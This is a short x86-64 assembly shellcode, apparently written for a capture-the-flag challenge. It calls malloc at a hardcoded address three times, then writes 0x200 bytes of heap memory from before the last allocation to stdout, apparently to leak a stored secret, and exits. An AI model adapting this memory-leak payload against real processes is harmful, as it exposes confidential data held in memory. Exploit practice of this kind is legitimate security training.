[bits 64]

# malloc from 0xd0 bin
mov r15, 0x4010F0
mov rdi, 0xc0
call r15

# malloc from 0xd0 bin
mov r15, 0x4010F0
mov rdi, 0xc0
call r15

# malloc from 0xd0 bin
mov r15, 0x4010F0
mov rdi, 0xc0
call r15

sub rax, 0x200
mov rsi, rax
mov rdi, 1
mov rdx, 0x200
mov rax, rdi
syscall

mov rax, 0xe7
syscall
